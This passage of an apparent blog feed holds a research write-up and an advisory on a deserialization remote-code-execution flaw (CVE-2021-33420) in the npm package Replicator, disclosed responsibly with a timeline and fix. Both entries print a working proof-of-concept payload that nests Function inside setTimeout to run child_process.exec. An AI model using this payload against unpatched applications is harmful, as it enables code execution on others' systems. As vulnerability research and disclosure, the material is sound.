machine.</p><h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><p>Replicator is an “advanced JavaScript objects serialization” package in npm. This package wraps around the JSON parse and stringify functions, and provides additional functionalities to it. On top of the JSON key-value pairs, Replicator adds support for the following 9 objects:</p><ul><li>undefined</li><li>NaN</li><li>Date</li><li>RegExp</li><li>Error</li><li>Map</li><li>Set</li><li>ArrayBuffer</li><li>Typed arrays</li></ul><h1 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h1><p>First, let’s get a general idea of how Replicator serializes and deserializes those unsupported JSON objects. When trying to serialize a <em><strong>Set</strong></em> object for example, the following output will be generated:</p><img src="/img/blogs/replicator/Image-1.png" style="width: 100%;"/><p>The object <em><strong>Set</strong></em> was changed to a valid JSON with the key “@t” pointing to the type of the object inside the double brackets “[[<em><strong>type</strong></em>]]”, and the parameters passed to the object are under the “data” property.</p><p>When researching these types of packages, it’s interesting to focus on the deserialization component since it is more likely that a user input would be string passed to the deserialization code rather than an object passing to the serialization code.</p><p>After checking how the deserialization is implemented in the code, the first 8 types seemed safe. However, with further examination, we came across an issue at the last object type – <em><strong>TypeArray</strong></em>.</p><img src="/img/blogs/replicator/Image-2.png" style="width: 100%;"/><p>The function on the bottom is the one responsible for the deserialization. With that, let’s serialize one of the TypeArrays – <em><strong>Int8Array</strong></em>:</p><img src="/img/blogs/replicator/Image-3.png" style="width: 100%;"/><p>The property “ctorName” states the object name of the <em><strong>TypeArray</strong></em> and the “arr” is the object value. But the issue in the code is that there is no validation that the object name in “ctorName” is actually a <em><strong>TypeArray</strong></em> object. When serializing, on the other hand, there is a validation using the list “TYPED_ARRAY_CTORS” defined earlier.</p><img src="/img/blogs/replicator/Image-4.png" style="height: 30%;width: 30%;"/><p>Looking at the code shown before we can invoke “new” on every function under the GLOBAL object with our own parameters. Something like this:</p><img src="/img/blogs/replicator/Image-5.png" style="width: 50%;"/><p>From here, there are limitations that we need to bypass in order to achieve the code execution.</p><ol><li>From the “fromSerializable” function check, the “ctorName” must be a name of a function.</li><li>The function must be a constructor.<ul><li>Hence, we can’t just call “Eval” because it’s not a constructor.</li></ul></li></ol><img src="/img/blogs/replicator/Image-6.png" style="width: 70%;"/><ol start="3"><li>Must be a direct descendent of the GLOBAL object.<ul><li>It’s impossible to call a function like “child_process.exec(‘evilcode’)” because we control only the value inside the brackets</li></ul></li></ol><img src="/img/blogs/replicator/image-7.jpg" style="width: 100%;"/><ol start="4"><li>Must be a valid JSON.<ul><li>As mentioned before, Replicator wraps around JSON parse and stringify. Due to that, the input string given to the decode function gets “JSON.parse” before going into the problematic “fromSerializable” function. So, calling “setImmediate” &#x2F; “setInterval” &#x2F; “setTimeout” isn’t possible because it requires a callback function as an input and that isn’t JSON valid.</li></ul></li></ol><img src="/img/blogs/replicator/Image-9.png" style="width: 100%;"/><p>The following payload will fail at JSON.parse before invoking a new setTimeout:</p><img src="/img/blogs/replicator/Image-10.png" style="width: 100%;"/><p>There is a way to pass a string (which is a JSON valid input) that will be converted to JavaScript code. Using a new “Function” will create an anonymous function with our payload, but it will not get executed.</p><img src="/img/blogs/replicator/Image-11.png" style="width: 70%;"/><p>At this point, it looks like we cannot go further, but there are still some security concerns and vulnerabilities despite the limitations:</p><ul><li>Calling an arbitrary function created by the application using replicator, which heavily depends on the application and the specific situation, something like:</li></ul><img src="/img/blogs/replicator/Image-12.png" style="width: 50%;"/><ul><li>Local file inclusion using “require” could lead to other vulnerabilities, such as: XSS, RCE, sensitive information disclosure, and more. This, as well, depends on the attack scenario.</li></ul><img src="/img/blogs/replicator/Image-13.png" style="width: 50%;"/><ul><li>Etc…</li></ul><p>After fuzzing and some more research, we asked ourselves what happens if we serialize a <em><strong>Set</strong></em> within a <em><strong>Set</strong></em>. What would that look like? Is it done recursively?</p><img src="/img/blogs/replicator/Image-14.png" style="width: 100%;"/><p>When understanding that the serialization&#x2F;deserialization is done recursively, the payload to an RCE was around the corner. As mentioned before, we can create a new “Function”, but nothing will run it, and we can call “setTimeout,” but have to give it a function to execute.</p><p>Combining these two, here is the final payload to trigger code execution:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replicator.<span class="title function_">decode</span>(<span class="string">&#x27;[&#123;&quot;@t&quot;:&quot;[[TypedArray]]&quot;,&quot;data&quot;:&#123;&quot;ctorName&quot;:&quot;setTimeout&quot;,&quot;arr&quot;:​&#123;&quot;@t&quot;:&quot;[[TypedArray]]&quot;,&quot;data&quot;:&#123;&quot;ctorName&quot;:&quot;Function&quot;,&quot;arr&quot;:&quot; process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);&quot;&#125;&#125;​&#125;&#125;]&#x27;</span>)</span><br></pre></td></tr></table></figure><img src="/img/blogs/replicator/Image-15.png" style="width: 100%;"/><p>The inner object will create a function with the code input as a string, and the other object, “setTimeout”, receives the function as an argument and runs the code.</p><p>Depends on the scope of the program, the shell exploit code could change. For example, in the picture above, the payload was: <code>require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;)</code> without <code>process.mainModule</code> because it was run in a REPL console.</p><h1 id="Recommendations"><a href="#Recommendations" class="headerlink" title="Recommendations"></a>Recommendations</h1><p>To avoid issues like this, update the npm Replicator package to version 1.0.4 or later.</p><h1 id="Summary-of-Disclosure-and-Events"><a href="#Summary-of-Disclosure-and-Events" class="headerlink" title="Summary of Disclosure and Events"></a>Summary of Disclosure and Events</h1><p>After discovering and validating the vulnerabilities, we notified npm of our findings and worked with them throughout the remediation process until they informed us the issues were appropriately patched. NPM’s responsiveness and professionalism throughout the process are commendable.</p><h1 id="Timeline-of-Disclosure"><a href="#Timeline-of-Disclosure" class="headerlink" title="Timeline of Disclosure"></a>Timeline of Disclosure</h1><table><thead><tr><th>Date</th><th>Action</th></tr></thead><tbody><tr><td>March 24, 2021</td><td>Vulnerability was reported responsibly</td></tr><tr><td>March 24, 2021</td><td>Checkmarx SCA customers using npm and Replicator were warned and provided mitigation guidance, * without exposing the technical details of the findings</td></tr><tr><td>May 14, 2021</td><td>Pull request to fix the issue was created</td></tr><tr><td>May 17, 2021</td><td>Fixed version 1.0.4 was released on NPM</td></tr><tr><td>May 17, 2021</td><td>Advisory with the full details was published on the Checkmarx advisory website</td></tr><tr><td>December 15, 2022</td><td>CVE-2021-33420 published</td></tr></tbody></table><h1 id="Final-Words"><a href="#Final-Words" class="headerlink" title="Final Words"></a>Final Words</h1><p>Discovering vulnerabilities like the ones documented in this report is why the Checkmarx Security Research Team performs investigations into open source projects. With open source making up the vast majority of today’s commercial software, security vulnerabilities must be taken seriously and handled carefully across the industry.</p><p>Solutions like <a href="https://checkmarx.com/product/cxsca-open-source-scanning/">Checkmarx SCA</a> are essential in helping organizations identify, prioritize, and remediate open source vulnerabilities more efficiently to improve their overall software security risk posture. Checkmarx SCA customers receive notice of issues like the ones described above in advance of public disclosure. For more information or to speak to an expert about how to detect, prioritize, and remediate open source risks in your code, contact us.</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://github.com/inikulin/replicator/issues/16">Issue</a></li><li><a href="https://github.com/inikulin/replicator/pull/17">Pull request</a></li><li><a href="https://github.com/inikulin/replicator/commit/2c626242fb4a118855262c64b5731b2ce98e521b">Fixing Commit</a></li><li><a href="https://advisory.checkmarx.net/advisory/CX-2021-4787">Advisory</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;NPM, the package manager for N</summary>
      
    
    
    
    
    <category term="deserialization" scheme="https://yaniv-git.github.io/tags/deserialization/"/>
    
    <category term="rce" scheme="https://yaniv-git.github.io/tags/rce/"/>
    
    <category term="npm" scheme="https://yaniv-git.github.io/tags/npm/"/>
    
  </entry>
  
  <entry>
    <title>Deserialization RCE attack in replicator</title>
    <link href="https://yaniv-git.github.io/2021/05/16/Deserialization%20RCE%20attack%20in%20replicator/"/>
    <id>https://yaniv-git.github.io/2021/05/16/Deserialization%20RCE%20attack%20in%20replicator/</id>
    <published>2021-05-16T22:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Affected versions of replicator npm package are vulnerable to a deserialization RCE via the TypedArrays objects. replicator doesn’t verify the object type given when deserializing TypedArrays and thus letting an attacker create arbitrary objects.</p><h2 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h2><p>replicator before 1.0.4.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>In case an untrusted data get deserialized, an attacker could achieve RCE.</p><h2 id="Steps-to-reproduce"><a href="#Steps-to-reproduce" class="headerlink" title="Steps to reproduce"></a>Steps to reproduce</h2><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replicator.decode(&#x27;[&#123;<span class="string">&quot;@t&quot;</span>:<span class="string">&quot;[[TypedArray]]&quot;</span>,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;ctorName&quot;</span>:<span class="string">&quot;setTimeout&quot;</span>,<span class="string">&quot;arr&quot;</span>:​&#123;<span class="string">&quot;@t&quot;</span>:<span class="string">&quot;[[TypedArray]]&quot;</span>,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;ctorName&quot;</span>:<span class="string">&quot;Function&quot;</span>,<span class="string">&quot;arr&quot;</span>:<span class="string">&quot;process.mainModule.require(<span class="subst">\&#x27;</span>child_process<span class="subst">\&#x27;</span>).exec(<span class="subst">\&#x27;</span>calc<span class="subst">\&#x27;</span>);&quot;</span>&#125;&#125;​&#125;&#125;]&#x27;)</span><br></pre></td></tr></table></figure><h3 id="Expected-result"><a href="#Expected-result" class="headerlink" title="Expected result:"></a>Expected result:</h3><p>The command in the exec function will be run, in this case aimed for a Windows machine a calculator will pop up.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>Update replicator dependency to 1.0.4 or above.</p><h2 id="Credit"><a href="#Credit" class="headerlink" title="Credit"></a>Credit</h2><p>This issue was discovered and reported by Checkmarx SCA Security Researcher <a href="https://twitter.com/ynizry">Yaniv Nizry</a>.</p><h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ol><li><a href="https://github.com/inikulin/replicator/pull/17">Pull request</a></li><li><a href="https://github.com/inikulin/replicator/issues/16">Issue</a></li><li><a href="https://github.com/inikulin/replicator/commit/2c626242fb4a118855262c64b5731b2ce98e521b">Commit</a></li><li><a href="https://checkmarx.com/blog/npm-replicator-remote-code-execution-deserialization">Blog</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Summary&quot;&gt;&lt;a href=&quot;#Summary&quot; class=&quot;headerlink&quot; title=&quot;Summary&quot;&gt;&lt;/a&gt;Summary&lt;/h2&gt;&lt;p&gt;Affected versions of replicator npm package are vu</summary>
      
    
    
    
    
    <category term="deserialization" scheme="https://yaniv-git.github.io/tags/deserialization/"/>
    
    <category term="rce" scheme="https://yaniv-git.github.io/tags/rce/"/>
    
    <category term="npm" scheme="https://yaniv-git.github.io/tags/npm/"/>
    
  </entry>
  
</feed>
